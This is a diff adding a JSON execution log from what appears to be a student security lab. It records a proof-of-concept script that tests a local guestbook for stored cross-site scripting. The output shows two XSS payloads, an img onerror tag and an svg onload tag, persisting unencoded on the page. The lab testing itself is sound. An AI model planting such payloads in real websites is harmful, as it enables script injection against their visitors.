@@ -1,0 +1,32 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\XSS-005__1.py",
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_low.cookie",
+    "--security-level",
+    "low",
+    "--name",
+    "wp4x5"
+  ],
+  "started_at": "2026-10-20T14:43:25+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.243,
+  "stdout": "GET form page: HTTP 200\r\nPOST: HTTP 200; verification GET: HTTP 200\r\nPOST response: raw_payload_count=1 escaped_payload_seen=False\r\nGET after POST: raw_payload_count=1 escaped_payload_seen=False\r\ncontext: sage: <img src=x onerror=console.log('LLM_LAB_XSS')><br /></div> <div id=\"guestbook_comments\">Name: wp4x5<br />Message: <svg/onload=alert('XSS-005-POC')><br /></div>   \t<br />    \t<h2>More Information</h2>  \t<ul>  \t\t<li><a href=\"https://owasp.org/www-community/attacks/xss\"\r\nobservation: payload persisted and returned unencoded; browser execution not tested here\r\n",
+  "stderr": "",
+  "cohort": "v1",
+  "stem": "XSS-005__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\XSS-005__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_low.cookie",
+    "--security-level",
+    "low",
+    "--name",
+    "wp4x5"
+  ]
+}
